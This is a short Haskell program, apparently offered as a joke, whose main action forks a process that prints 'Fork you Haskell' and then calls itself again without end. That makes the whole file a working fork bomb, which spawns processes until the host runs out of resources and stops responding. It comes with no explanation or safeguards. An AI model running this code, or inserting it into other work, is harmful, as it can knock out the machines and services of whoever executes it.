import System.Posix.Process.ByteString

main = do
	forkProcess $ putStrLn "Fork you Haskell"
	main
